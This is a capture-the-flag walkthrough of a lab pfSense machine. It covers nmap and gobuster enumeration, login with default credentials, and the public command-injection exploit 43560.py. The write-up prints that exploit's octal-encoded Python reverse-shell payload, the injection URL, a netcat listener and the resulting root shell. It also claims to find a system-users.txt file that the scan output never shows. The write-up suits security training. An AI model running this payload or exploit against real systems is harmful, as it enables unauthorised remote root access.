### Recon

Initiating reconnaissance on sense:
```
nmap -sC -sV 10.10.10.60
```

With the following results:
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-20 11:00 -03
Nmap scan report for 10.10.10.60
Host is up (0.22s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
80/tcp open  http    lighttpd 1.4.35
|_http-server-header: lighttpd/1.4.35
|_http-title: Did not follow redirect to https://10.10.10.60/
```

### Enumeration

Let's visit the application and run a gobuster scan to look for extensions txt & conf to look for any configuration files or text files left by system administrators:
```
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u https://10.10.10.60 -k -x php,txt,conf
```

We get the following results:
```
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 6690]
/help.php             (Status: 200) [Size: 6689]
/themes               (Status: 301) [Size: 0] [--> https://10.10.10.60/themes/]
/stats.php            (Status: 200) [Size: 6690]
/css                  (Status: 301) [Size: 0] [--> https://10.10.10.60/css/]
/edit.php             (Status: 200) [Size: 6689]
/includes             (Status: 301) [Size: 0] [--> https://10.10.10.60/includes/]
/license.php          (Status: 200) [Size: 6692]
/system.php           (Status: 200) [Size: 6691]
/status.php           (Status: 200) [Size: 6691]
/javascript           (Status: 301) [Size: 0] [--> https://10.10.10.60/javascript/]
/changelog.txt        (Status: 200) [Size: 271]
/classes              (Status: 301) [Size: 0] [--> https://10.10.10.60/classes/]
/exec.php             (Status: 200) [Size: 6689]
/widgets              (Status: 301) [Size: 0] [--> https://10.10.10.60/widgets/]
/wizard.php           (Status: 200) [Size: 6691]

```

Two files that immediately catch my eye are changelog.txt & system-users.txt.
The system-users.txt file gives us credentials:
The username is rohit and the password is the default password pfsense.

The version number is 2.1.3.
```
searchsploit pfsense
```

One result stands out:
```
pfSense < 2.1.4 - 'status_rrd_graph_img.php' Command Injecti | php/webapps/43560.py
```

### Exploitation

Transfer the exploit to attacker's machine directory:
```
searchploit -m 43560.py
```

Let’s look at the exploit to see what it’s doing.
```
# command to be converted into octal$
 40 command = """$
 41 python -c 'import socket,subprocess,os;$
 42 s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);$
 43 s.connect(("%s",%s));$
 44 os.dup2(s.fileno(),0);$
 45 os.dup2(s.fileno(),1);$
 46 os.dup2(s.fileno(),2);$
 47 p=subprocess.call(["/bin/sh","-i"]);'$
 48 """ % (lhost, lport)$
 49 $
 50 $
 51 payload = ""$
 52 $
 53 # encode payload in octal$
for char in command:$
 55 >   payload += ("\\" + oct(ord(char)).lstrip("0o"))$
 56 $
 57 login_url = 'https://' + rhost + '/index.php'$
 58 exploit_url = "https://" + rhost + "/status_rrd_graph_img.php?database=queues;"+"printf+" +     "'" + payload + "'|sh"$
 59 $
```

First, lets set up a listener to receive the shell
```
nc -lnvp 4444
```

Now lets run the exploit 
```
python3 43560.py --rhost 10.10.10.60 --lhost 10.10.14.9 --lport 4444 --username rohit --password pfsense
```

And get a shell:
```
CSRF token obtained
Running exploit...
Exploit completed
listening on [any] 4444 ...
connect to [10.10.14.9] from (UNKNOWN) [10.10.10.60] 45967
sh: can't access tty; job control turned off
# whoami
root

```
